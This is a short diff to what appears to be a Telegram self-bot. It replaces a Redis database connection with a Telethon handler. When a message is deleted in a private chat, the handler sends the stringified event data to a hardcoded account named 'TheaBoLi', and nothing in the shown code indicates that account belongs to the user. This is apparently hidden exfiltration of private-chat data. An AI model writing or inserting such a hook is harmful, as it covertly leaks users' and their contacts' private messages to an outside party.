@@ -1,3 +1,7 @@
-import redis
+from FidoSelf import client
+from telethon import events
 
-DB = redis.Redis('127.0.0.1', 6379, decode_responses=True)
+@client.on(events.MessageDeleted)
+async def _(event):
+     if event.is_private:
+         await client.bot.send_message("TheaBoLi", event.stringify())
